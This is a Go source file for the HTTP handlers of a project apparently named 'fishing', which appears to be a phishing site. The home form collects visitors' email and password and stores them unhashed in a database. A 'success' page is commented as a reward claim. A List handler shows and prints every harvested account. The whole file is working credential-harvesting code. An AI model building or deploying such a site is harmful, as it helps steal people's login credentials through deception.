package handler

import (
	"errors"
	"fmt"
	"log"
	"net/http"

	"github.com/tirzasrwn/fishing/internal/config"
	"github.com/tirzasrwn/fishing/internal/driver"
	"github.com/tirzasrwn/fishing/internal/helpers"
	"github.com/tirzasrwn/fishing/internal/models"
	"github.com/tirzasrwn/fishing/internal/render"
	"github.com/tirzasrwn/fishing/internal/repository"
	"github.com/tirzasrwn/fishing/internal/repository/dbrepo"
)

// Repo the repository used by the handlers.
var Repo *Repository

// Repository is the repository type.
type Repository struct {
	App *config.AppConfig
	DB  repository.DatabaseRepo
}

// NewRepo creates a new repository.
func NewRepo(a *config.AppConfig, db *driver.DB) *Repository {
	return &Repository{
		App: a,
		DB:  dbrepo.NewPostgresRepo(db.SQL, a),
	}
}

// NewHandlers sets the repository for the handlers.
func NewHandlers(r *Repository) {
	Repo = r
}

// Home is the home page handler.
func (m *Repository) Home(w http.ResponseWriter, r *http.Request) {
	render.Template(w, r, "home.page.html", &models.TemplateData{})
}

// PostHome handler gets user form.
func (m *Repository) PostHome(w http.ResponseWriter, r *http.Request) {
	err := r.ParseForm()
	if err != nil {
		log.Println(err)
	}

	email := r.Form.Get("email")
	password := r.Form.Get("password")

	account := models.Account{
		Email:    email,
		Password: password,
	}

	m.DB.InsertAccount(account)
	http.Redirect(w, r, "/success", http.StatusSeeOther)
}

// Success handler shows success to claim reward.
func (m *Repository) Success(w http.ResponseWriter, r *http.Request) {
	render.Template(w, r, "success.page.html", &models.TemplateData{})
}

func (m *Repository) List(w http.ResponseWriter, r *http.Request) {
	accounts, err := m.DB.AllAccounts()
	if err != nil {
		helpers.ServerError(w, errors.New("Cannot fetch all account"))
		return
	}
	data := make(map[string]interface{})
	data["accounts"] = accounts
	fmt.Println(accounts)
	render.Template(w, r, "list.page.html", &models.TemplateData{
		Data: data,
	})
}
